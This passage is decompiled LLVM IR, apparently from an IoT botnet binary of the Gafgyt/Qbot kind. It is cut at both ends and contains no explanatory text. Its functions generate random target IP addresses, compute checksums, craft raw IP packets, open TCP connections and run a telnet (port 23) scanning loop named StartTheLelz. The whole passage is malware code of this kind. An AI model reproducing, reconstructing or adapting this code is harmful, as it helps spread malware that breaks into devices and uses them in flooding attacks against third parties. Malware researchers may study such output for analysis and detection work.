  store i32 0, i32* %stack_var_-56, align 4
  %v2_100033f4 = ptrtoint i32* %stack_var_-56 to i32
  %v4_10003454 = call i32 @szprintf(i32 %v2_100033f4, i32 ptrtoint ([12 x i8]* @global_var_10011ca8.53 to i32), i32 %v4_10003130)
  store i32 268448868, i32* @lr, align 4
  %v1_10003460 = call i32 @inet_addr(i32 %v2_100033f4)
  ret i32 %v1_10003460

; uselistorder directives
  uselistorder i32 %v2_100033f4, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i8* @global_var_10024a4a.51, { 1, 0 }
  uselistorder i8* @global_var_10024a49.50, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_10024a48.49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100032bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003280, { 1, 0 }
  uselistorder label %dec_label_pc_10003258, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000321c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100031e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000312c, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100034a0 = load i32, i32* @global_var_10024a50.54, align 4
  store i32 %v3_100034a0, i32* @r3, align 4
  %v2_100034a8 = call i32 @ntohl(i32 %v3_100034a0, i32 268566528)
  %v2_100034b4 = and i32 %v2_100034a8, %arg1
  %v0_100034bc = call i32 @rand_cmwc()
  %v1_100034c8 = sub i32 -1, %arg1
  %v2_100034cc = and i32 %v0_100034bc, %v1_100034c8
  %v2_100034d4 = xor i32 %v2_100034cc, %v2_100034b4
  ret i32 %v2_100034d4
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100035643 = icmp sgt i32 %arg2, 1
  br i1 %v2_100035643, label %dec_label_pc_1000351c, label %dec_label_pc_1000356c

dec_label_pc_1000351c:                            ; preds = %entry, %dec_label_pc_1000351c
  %stack_var_-24.08 = phi i16* [ %v5_10003550, %dec_label_pc_1000351c ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_10003558, %dec_label_pc_1000351c ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_1000353c, %dec_label_pc_1000351c ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_10003538, %dec_label_pc_1000351c ], [ 0, %entry ]
  %v4_1000351c = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_10003520 = load i16, i16* %stack_var_-24.08, align 2
  %v3_10003520 = zext i16 %v2_10003520 to i32
  %v2_10003538 = add i32 %v3_10003520, %stack_var_-12.05
  %v3_10003538 = icmp ult i32 %v2_10003538, %stack_var_-12.05
  %v4_1000353c = zext i1 %v3_10003538 to i32
  %v5_1000353c = add i32 %v4_1000353c, %stack_var_-16.06
  %v1_1000354c = add i32 %v4_1000351c, 2
  %v5_10003550 = inttoptr i32 %v1_1000354c to i16*
  %v1_10003558 = add nsw i32 %stack_var_-20.07, -2
  %v2_10003564 = icmp sgt i32 %v1_10003558, 1
  br i1 %v2_10003564, label %dec_label_pc_1000351c, label %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge

dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge: ; preds = %dec_label_pc_1000351c
  %v3_10003564.le = icmp eq i32 %v1_10003558, 1
  br i1 %v3_10003564.le, label %dec_label_pc_10003578, label %dec_label_pc_100035e4.preheader

dec_label_pc_1000356c:                            ; preds = %entry
  %v3_100035644 = icmp eq i32 %arg2, 1
  br i1 %v3_100035644, label %dec_label_pc_10003578, label %dec_label_pc_100035e4.preheader

dec_label_pc_10003578:                            ; preds = %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge, %dec_label_pc_1000356c
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_10003550, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ %arg1, %dec_label_pc_1000356c ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_1000353c, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_10003538, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ]
  %v1_1000357c = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_1000357c = load i8, i8* %v1_1000357c, align 1
  %v3_1000357c = zext i8 %v2_1000357c to i32
  %v2_10003594 = add i32 %v3_1000357c, %stack_var_-12.0.lcssa18
  %v3_10003594 = icmp ult i32 %v2_10003594, %stack_var_-12.0.lcssa18
  %v4_10003598 = zext i1 %v3_10003594 to i32
  %v5_10003598 = add i32 %v4_10003598, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_100035e4.preheader

dec_label_pc_100035e4.preheader:                  ; preds = %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge, %dec_label_pc_10003578, %dec_label_pc_1000356c
  %stack_var_-12.1.ph = phi i32 [ %v2_10003538, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ], [ %v2_10003594, %dec_label_pc_10003578 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_1000353c, %dec_label_pc_10003560.dec_label_pc_1000356c_crit_edge ], [ 0, %dec_label_pc_1000356c ], [ %v5_10003598, %dec_label_pc_10003578 ]
  %v1_100035e829 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_100035f030 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100035f431 = or i32 %v1_100035e829, %v1_100035f030
  %v1_100035fc32 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_1000360433 = or i32 %v2_100035f431, %v1_100035fc32
  %v3_1000360834 = icmp eq i32 %v2_1000360433, 0
  br i1 %v3_1000360834, label %dec_label_pc_10003610, label %dec_label_pc_100035a8

dec_label_pc_100035a8:                            ; preds = %dec_label_pc_100035e4.preheader, %dec_label_pc_100035a8
  %v1_100035fc37 = phi i32 [ %v1_100035fc, %dec_label_pc_100035a8 ], [ %v1_100035fc32, %dec_label_pc_100035e4.preheader ]
  %v2_100035f436 = phi i32 [ %v2_100035f4, %dec_label_pc_100035a8 ], [ %v2_100035f431, %dec_label_pc_100035e4.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_100035d4, %dec_label_pc_100035a8 ], [ %stack_var_-12.1.ph, %dec_label_pc_100035e4.preheader ]
  %v1_100035b4 = urem i32 %stack_var_-12.135, 65536
  %v2_100035d4 = add i32 %v2_100035f436, %v1_100035b4
  %v3_100035d4 = icmp ult i32 %v2_100035d4, %v1_100035b4
  %v4_100035d8 = zext i1 %v3_100035d4 to i32
  %v5_100035d8 = add nuw nsw i32 %v4_100035d8, %v1_100035fc37
  %v1_100035e8 = mul i32 %v5_100035d8, 65536
  %v1_100035f0 = udiv i32 %v2_100035d4, 65536
  %v2_100035f4 = or i32 %v1_100035e8, %v1_100035f0
  %v1_100035fc = udiv i32 %v5_100035d8, 65536
  %v2_10003604 = or i32 %v2_100035f4, %v1_100035fc
  %v3_10003608 = icmp eq i32 %v2_10003604, 0
  br i1 %v3_10003608, label %dec_label_pc_100035e4.dec_label_pc_10003610_crit_edge, label %dec_label_pc_100035a8

dec_label_pc_100035e4.dec_label_pc_10003610_crit_edge: ; preds = %dec_label_pc_100035a8
  br label %dec_label_pc_10003610

dec_label_pc_10003610:                            ; preds = %dec_label_pc_100035e4.dec_label_pc_10003610_crit_edge, %dec_label_pc_100035e4.preheader
  %v4_10003610 = zext i16 %tmp21 to i32
  %v1_1000361c = xor i32 %v4_10003610, 65535
  ret i32 %v1_1000361c

; uselistorder directives
  uselistorder i32 %v2_100035f4, { 1, 0 }
  uselistorder i32 %v5_100035d8, { 1, 0 }
  uselistorder i32 %v2_100035d4, { 0, 2, 1 }
  uselistorder i32 %v1_100035fc32, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10003558, { 0, 2, 1 }
  uselistorder i32 %v2_10003538, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100035a8, { 1, 0 }
  uselistorder label %dec_label_pc_100035e4.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10003578, { 1, 0 }
  uselistorder label %dec_label_pc_1000351c, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10003634 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10003634, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10003660 = add i32 %arg1, 12
  %v2_10003660 = inttoptr i32 %v1_10003660 to i32*
  %v3_10003660 = load i32, i32* %v2_10003660, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_1000366c = add i32 %arg1, 16
  %v2_1000366c = inttoptr i32 %v1_1000366c to i32*
  %v3_1000366c = load i32, i32* %v2_1000366c, align 4
  store i32 20, i32* @r3, align 4
  %v1_10003688 = call i32 @htons(i32 20)
  store i32 32, i32* @r3, align 4
  store i32 268449448, i32* @lr, align 4
  %v0_100036a4 = call i32 @malloc()
  store i32 %v0_100036a4, i32* %r11.global-to-local, align 4
  store i32 %v3_1000366c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100036c4 = inttoptr i32 %v0_100036a4 to i32*
  store i32 %v3_10003660, i32* %v2_100036c4, align 4
  %v0_100036c8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100036c8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036c8 = add i32 %v1_100036c8, 4
  %v3_100036c8 = inttoptr i32 %v2_100036c8 to i32*
  store i32 %v0_100036c8, i32* %v3_100036c8, align 4
  %v0_100036cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100036cc = load i32, i32* %r11.global-to-local, align 4
  %v2_100036cc = add i32 %v1_100036cc, 8
  %v3_100036cc = inttoptr i32 %v2_100036cc to i32*
  store i32 %v0_100036cc, i32* %v3_100036cc, align 4
  %v1_100036d4 = add i32 %v0_100036a4, 12
  store i32 %v1_100036d4, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100036dc = load i32, i32* %arg2, align 4
  %v1_100036e0 = add i32 %tmp, 4
  %v2_100036e0 = inttoptr i32 %v1_100036e0 to i32*
  %v3_100036e0 = load i32, i32* %v2_100036e0, align 4
  store i32 %v3_100036e0, i32* %r10.global-to-local, align 4
  %v1_100036e4 = add i32 %tmp, 8
  %v2_100036e4 = inttoptr i32 %v1_100036e4 to i32*
  %v3_100036e4 = load i32, i32* %v2_100036e4, align 4
  %v1_100036e8 = add i32 %tmp, 12
  %v2_100036e8 = inttoptr i32 %v1_100036e8 to i32*
  %v3_100036e8 = load i32, i32* %v2_100036e8, align 4
  %v2_100036ec = inttoptr i32 %v1_100036d4 to i32*
  store i32 %v2_100036dc, i32* %v2_100036ec, align 4
  %v0_100036f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100036f0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036f0 = add i32 %v1_100036f0, 4
  %v3_100036f0 = inttoptr i32 %v2_100036f0 to i32*
  store i32 %v0_100036f0, i32* %v3_100036f0, align 4
  %v1_100036f4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036f4 = add i32 %v1_100036f4, 8
  %v3_100036f4 = inttoptr i32 %v2_100036f4 to i32*
  store i32 %v3_100036e4, i32* %v3_100036f4, align 4
  %v1_100036f8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100036f8 = add i32 %v1_100036f8, 12
  %v3_100036f8 = inttoptr i32 %v2_100036f8 to i32*
  store i32 %v3_100036e8, i32* %v3_100036f8, align 4
  %v1_100036fc = add i32 %tmp, 16
  %v2_100036fc = inttoptr i32 %v1_100036fc to i32*
  %v3_100036fc = load i32, i32* %v2_100036fc, align 4
  %v1_10003700 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003700 = add i32 %v1_10003700, 16
  %v3_10003700 = inttoptr i32 %v2_10003700 to i32*
  store i32 %v3_100036fc, i32* %v3_10003700, align 4
  %v5_1000370c = inttoptr i32 %v0_100036a4 to i16*
  %v6_1000370c = call i32 @csum(i16* %v5_1000370c, i32 32, i32 %v3_100036e8, i32 %v3_100036e4, i32 %tmp)
  %sext = mul i32 %v6_1000370c, 65536
  %v1_10003710 = sdiv i32 %sext, 65536
  store i32 %v0_100036a4, i32* @r3, align 4
  store i32 268449568, i32* @lr, align 4
  %v0_1000371c = call i32 @free()
  %v1_10003724 = urem i32 %v1_10003710, 65536
  %v2_1000372c = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1000372c, i32* %r11.global-to-local, align 4
  ret i32 %v1_10003724

; uselistorder directives
  uselistorder i32 %v0_100036a4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_1000377c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_1000377c, i32* %arg1, align 4
  %v1_10003790 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003790, i32* %arg1, align 4
  %v3_100037a0 = add i32 %tmp1, 1
  %v4_100037a0 = inttoptr i32 %v3_100037a0 to i8*
  store i8 0, i8* %v4_100037a0, align 1
  %fold = add i32 %arg5, 20
  %v1_100037b8 = trunc i32 %fold to i16
  %v3_100037b8 = add i32 %tmp1, 2
  %v4_100037b8 = inttoptr i32 %v3_100037b8 to i16*
  store i16 %v1_100037b8, i16* %v4_100037b8, align 2
  %v0_100037bc = call i32 @rand_cmwc()
  %v1_100037cc = trunc i32 %v0_100037bc to i16
  %v3_100037cc = add i32 %tmp1, 4
  %v4_100037cc = inttoptr i32 %v3_100037cc to i16*
  store i16 %v1_100037cc, i16* %v4_100037cc, align 2
  %v3_100037d8 = add i32 %tmp1, 6
  %v4_100037d8 = inttoptr i32 %v3_100037d8 to i16*
  store i16 0, i16* %v4_100037d8, align 2
  %v3_100037e4 = add i32 %tmp1, 8
  %v4_100037e4 = inttoptr i32 %v3_100037e4 to i8*
  store i8 -1, i8* %v4_100037e4, align 1
  %v3_100037f0 = add i32 %tmp1, 9
  %v4_100037f0 = inttoptr i32 %v3_100037f0 to i8*
  store i8 %tmp, i8* %v4_100037f0, align 1
  %v3_100037fc = add i32 %tmp1, 10
  %v4_100037fc = inttoptr i32 %v3_100037fc to i16*
  store i16 0, i16* %v4_100037fc, align 2
  %v2_10003808 = add i32 %tmp1, 12
  %v3_10003808 = inttoptr i32 %v2_10003808 to i32*
  store i32 %arg3, i32* %v3_10003808, align 4
  %v2_10003814 = add i32 %tmp1, 16
  %v3_10003814 = inttoptr i32 %v2_10003814 to i32*
  store i32 %arg2, i32* %v3_10003814, align 4
  ret i32 %v0_100037bc
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000384c = icmp sgt i32 %arg1, 2
  br i1 %v2_1000384c, label %dec_label_pc_10003860, label %dec_label_pc_10003870

dec_label_pc_10003860:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10003868.55 to i32), i32* @lr, align 4
  %v1_10003864 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10003870

dec_label_pc_10003870:                            ; preds = %entry, %dec_label_pc_10003860
  %storemerge = phi i32 [ 0, %dec_label_pc_10003860 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10003870, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268449984, i32* @lr, align 4
  %v1_100038bc = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_100038cc = icmp eq i32 %v1_100038bc, 0
  br i1 %v3_100038cc, label %dec_label_pc_100038d4, label %dec_label_pc_100038e0

dec_label_pc_100038d4:                            ; preds = %entry
  br label %dec_label_pc_100039b8

dec_label_pc_100038e0:                            ; preds = %entry
  %v1_100038e4 = add i32 %v1_100038bc, 16
  %v2_100038e4 = inttoptr i32 %v1_100038e4 to i32*
  %v3_100038e4 = load i32, i32* %v2_100038e4, align 4
  %v1_100038e8 = inttoptr i32 %v3_100038e4 to i32*
  %v2_100038e8 = load i32, i32* %v1_100038e8, align 4
  %v1_100038f0 = add i32 %v1_100038bc, 12
  %v2_100038f0 = inttoptr i32 %v1_100038f0 to i32*
  %v3_100038f0 = load i32, i32* %v2_100038f0, align 4
  %v2_100038f8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_100038fc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_100038f0, i32* @r5, align 4
  store i32 268450064, i32* @lr, align 4
  %v4_1000390c = call i32 @bcopy(i32 %v2_100038e8, i32 %v2_100038fc, i32 %v3_100038f0, i32 %v2_100038f8)
  %v4_10003910 = zext i16 %arg2 to i32
  store i32 %v4_10003910, i32* @r3, align 4
  %v1_1000391c = call i32 @htons(i32 %v4_10003910)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268450112, i32* @lr, align 4
  %v3_1000393c = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_10003948 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268450148, i32* @lr, align 4
  %v5_10003960 = call i32 @__GI_setsockopt(i32 %v3_1000393c, i32 6, i32 1, i32 %v2_10003948, i32 4)
  %v4_1000396c = icmp eq i32 %v3_1000393c, -1
  br i1 %v4_1000396c, label %dec_label_pc_10003974, label %dec_label_pc_10003980

dec_label_pc_10003974:                            ; preds = %dec_label_pc_100038e0
  br label %dec_label_pc_100039b8

dec_label_pc_10003980:                            ; preds = %dec_label_pc_100038e0
  store i32 268450196, i32* @lr, align 4
  %v3_10003990 = call i32 @__libc_connect(i32 %v3_1000393c, i32 %v2_100038f8, i32 16)
  %v4_1000399c = icmp eq i32 %v3_10003990, -1
  br i1 %v4_1000399c, label %dec_label_pc_100039a4, label %dec_label_pc_100039b0

dec_label_pc_100039a4:                            ; preds = %dec_label_pc_10003980
  br label %dec_label_pc_100039b8

dec_label_pc_100039b0:                            ; preds = %dec_label_pc_10003980
  br label %dec_label_pc_100039b8

dec_label_pc_100039b8:                            ; preds = %dec_label_pc_100039a4, %dec_label_pc_10003974, %dec_label_pc_100038d4, %dec_label_pc_100039b0
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_100038d4 ], [ 0, %dec_label_pc_10003974 ], [ 0, %dec_label_pc_100039a4 ], [ %v3_1000393c, %dec_label_pc_100039b0 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_100038f8, { 1, 0 }
  uselistorder i32 %v3_100038f0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100039b8, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100039d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100039d8, i32* %stack_var_-640, align 4
  store i32 268450316, i32* @lr, align 4
  %v1_10003a08 = call i32 @__GI_time(i32 0)
  %v0_10003a14 = call i32 @rand_cmwc()
  %v2_10003a1c = xor i32 %v1_10003a08, %v0_10003a14
  store i32 ptrtoint (i32* @global_var_10003a28.56 to i32), i32* @lr, align 4
  %v1_10003a24 = call i32 @srand(i32 %v2_10003a1c)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003a34 = call i32 @htons(i32 23)
  %v2_10003a44 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10003a44, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268450400, i32* @lr, align 4
  %v0_10003a5c = call i32 @malloc()
  store i32 1025, i32* %r9.global-to-local, align 4
  store i32 268450432, i32* @lr, align 4
  %v3_10003a7c = call i32 @__GI_memset(i32 %v0_10003a5c, i32 0, i32 1025)
  %v1_10003a84 = mul i32 %arg2, 28
  %v1_10003a8c = add i32 %v1_10003a84, 30
  %v1_10003a90 = and i32 %v1_10003a8c, -16
  %v2_10003a98 = load i32, i32* %stack_var_-640, align 4
  %v1_10003aa0 = load i32, i32* @r1, align 4
  %v3_10003aa0 = sub i32 %v1_10003aa0, %v1_10003a90
  %v4_10003aa0 = inttoptr i32 %v3_10003aa0 to i32*
  store i32 %v2_10003a98, i32* %v4_10003aa0, align 4
  %v1_10003ab0 = add i32 %v3_10003aa0, 23
  %v1_10003ab4 = and i32 %v1_10003ab0, -16
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  %v1_10003ad0 = mul i32 %arg2, 5
  store i32 ptrtoint (i32* @global_var_10003ae4.57 to i32), i32* @lr, align 4
  %v3_10003ae0 = call i32 @__GI_memset(i32 %v1_10003ab4, i32 0, i32 %v1_10003ad0)
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10003b8010 = icmp sgt i32 %arg2, 0
  br i1 %v2_10003b8010, label %dec_label_pc_10003af0, label %dec_label_pc_10003b88

dec_label_pc_10003af0:                            ; preds = %entry, %dec_label_pc_10003af0
  %storemerge313 = phi i32 [ %v1_10003b70, %dec_label_pc_10003af0 ], [ 0, %entry ]
  %v1_10003af8 = mul i32 %storemerge313, 28
  %v2_10003afc = add i32 %v1_10003af8, %v1_10003ab4
  store i32 %v2_10003afc, i32* %r9.global-to-local, align 4
  %v2_10003b04 = inttoptr i32 %v2_10003afc to i32*
  store i32 0, i32* %v2_10003b04, align 4
  %v1_10003b0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b0c = add i32 %v1_10003b0c, 4
  %v3_10003b0c = inttoptr i32 %v2_10003b0c to i32*
  store i32 0, i32* %v3_10003b0c, align 4
  %v1_10003b14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b14 = add i32 %v1_10003b14, 8
  %v3_10003b14 = inttoptr i32 %v2_10003b14 to i32*
  store i32 0, i32* %v3_10003b14, align 4
  %v1_10003b1c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b1c = add i32 %v1_10003b1c, 12
  %v3_10003b1c = inttoptr i32 %v2_10003b1c to i32*
  store i32 0, i32* %v3_10003b1c, align 4
  %v1_10003b24 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b24 = add i32 %v1_10003b24, 16
  %v3_10003b24 = inttoptr i32 %v2_10003b24 to i32*
  store i32 0, i32* %v3_10003b24, align 4
  %v1_10003b2c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b2c = add i32 %v1_10003b2c, 20
  %v3_10003b2c = inttoptr i32 %v2_10003b2c to i32*
  store i32 0, i32* %v3_10003b2c, align 4
  %v1_10003b34 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b34 = add i32 %v1_10003b34, 24
  %v3_10003b34 = inttoptr i32 %v2_10003b34 to i32*
  store i32 0, i32* %v3_10003b34, align 4
  %v3_10003b4c = add i32 %v2_10003afc, 9
  %v4_10003b4c = inttoptr i32 %v3_10003b4c to i8*
  store i8 1, i8* %v4_10003b4c, align 1
  %v1_10003b60 = add i32 %v2_10003afc, 24
  %v2_10003b68 = inttoptr i32 %v1_10003b60 to i32*
  store i32 %v0_10003a5c, i32* %v2_10003b68, align 4
  %v1_10003b70 = add nuw nsw i32 %storemerge313, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10003b80 = icmp slt i32 %v1_10003b70, %arg2
  br i1 %v2_10003b80, label %dec_label_pc_10003af0, label %dec_label_pc_10003b88

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003af0, %entry
  br label %dec_label_pc_10003b90

dec_label_pc_10003b90:                            ; preds = %dec_label_pc_10003b90, %dec_label_pc_10003b88
  %stack_var_-604.0 = phi i32 [ 0, %dec_label_pc_10003b88 ], [ %v1_10003b94, %dec_label_pc_10003b90 ]
  %v1_10003b94 = add i32 %stack_var_-604.0, 1
  %v1_10003ba8 = mul i32 %v1_10003b94, 4
  %v2_10003bac = add i32 %v1_10003ba8, ptrtoint ([10 x i8*]* @global_var_10024610.68 to i32)
  store i32 %v2_10003bac, i32* %r9.global-to-local, align 4
  %v1_10003bb0 = inttoptr i32 %v2_10003bac to i32*
  %v2_10003bb0 = load i32, i32* %v1_10003bb0, align 4
  %v3_10003bb4 = icmp eq i32 %v2_10003bb0, 0
  br i1 %v3_10003bb4, label %dec_label_pc_10003bbc.preheader, label %dec_label_pc_10003b90

dec_label_pc_10003bbc.preheader:                  ; preds = %dec_label_pc_10003b90
  %v2_10003c04 = add i32 %v1_10003ab4, 16
  %v2_10003d18 = or i32 %v1_10003ab4, 4
  %v2_10003ee4 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_10003bbc

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003bbc, %dec_label_pc_100049b0, %dec_label_pc_10003bbc.preheader
  store i32 %arg2, i32* %r9.global-to-local, align 4
  br i1 %v2_10003b8010, label %dec_label_pc_10003bc8, label %dec_label_pc_10003bbc

dec_label_pc_10003bc8:                            ; preds = %dec_label_pc_10003bbc, %dec_label_pc_100049b0
  %storemerge48 = phi i32 [ %v1_100049b4, %dec_label_pc_100049b0 ], [ 0, %dec_label_pc_10003bbc ]
  %v1_10003bd0 = mul i32 %storemerge48, 28
  %v2_10003bd4 = add i32 %v1_10003bd0, %v1_10003ab4
  %v1_10003bd8 = add i32 %v2_10003bd4, 16
  store i32 %v1_10003bd8, i32* %r9.global-to-local, align 4
  %v1_10003bdc = inttoptr i32 %v1_10003bd8 to i32*
  %v2_10003bdc = load i32, i32* %v1_10003bdc, align 4
  %v3_10003be0 = icmp eq i32 %v2_10003bdc, 0
  br i1 %v3_10003be0, label %dec_label_pc_10003be8, label %dec_label_pc_10003c10

dec_label_pc_10003be8:                            ; preds = %dec_label_pc_10003bc8
  store i32 268450804, i32* @lr, align 4
  %v1_10003bf0 = call i32 @__GI_time(i32 0)
  %v1_10003c00 = mul i32 %storemerge48, 28
  %v1_10003c08 = add i32 %v2_10003c04, %v1_10003c00
  store i32 %v1_10003c08, i32* %r9.global-to-local, align 4
  %v2_10003c0c = inttoptr i32 %v1_10003c08 to i32*
  store i32 %v1_10003bf0, i32* %v2_10003c0c, align 4
  br label %dec_label_pc_10003c10

dec_label_pc_10003c10:                            ; preds = %dec_label_pc_10003bc8, %dec_label_pc_10003be8
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003c20 = add i32 %v2_10003bd4, 8
  %v2_10003c20 = inttoptr i32 %v1_10003c20 to i8*
  %v3_10003c20 = load i8, i8* %v2_10003c20, align 4
  %v2_10003c30 = icmp ugt i8 %v3_10003c20, 7
  br i1 %v2_10003c30, label %dec_label_pc_100049b0, label %dec_label_pc_10003c38

dec_label_pc_10003c38:                            ; preds = %dec_label_pc_10003c10
  %v4_10003c20 = zext i8 %v3_10003c20 to i32
  %v1_10003c3c = mul nuw nsw i32 %v4_10003c20, 4
  %v2_10003c48 = add i32 %v1_10003c3c, ptrtoint (i32* @global_var_10011d28.69 to i32)
  store i32 %v2_10003c48, i32* %r9.global-to-local, align 4
  %v1_10003c4c = inttoptr i32 %v2_10003c48 to i32*
  %v2_10003c4c = load i32, i32* %v1_10003c4c, align 4
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v2_10003c58 = add i32 %v2_10003c4c, ptrtoint (i32* @global_var_10011d28.69 to i32)
  call void @__pseudo_branch(i32 %v2_10003c58)
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003c74 = add i32 %v2_10003bd4, 9
  %v2_10003c74 = inttoptr i32 %v1_10003c74 to i8*
  %v3_10003c74 = load i8, i8* %v2_10003c74, align 1
  %v3_10003c7c = icmp eq i8 %v3_10003c74, 1
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  br i1 %v3_10003c7c, label %dec_label_pc_10003c84, label %dec_label_pc_10003d28

dec_label_pc_10003c84:                            ; preds = %dec_label_pc_10003c38
  %v1_10003c94 = add i32 %v2_10003bd4, 24
  store i32 %v1_10003c94, i32* %r9.global-to-local, align 4
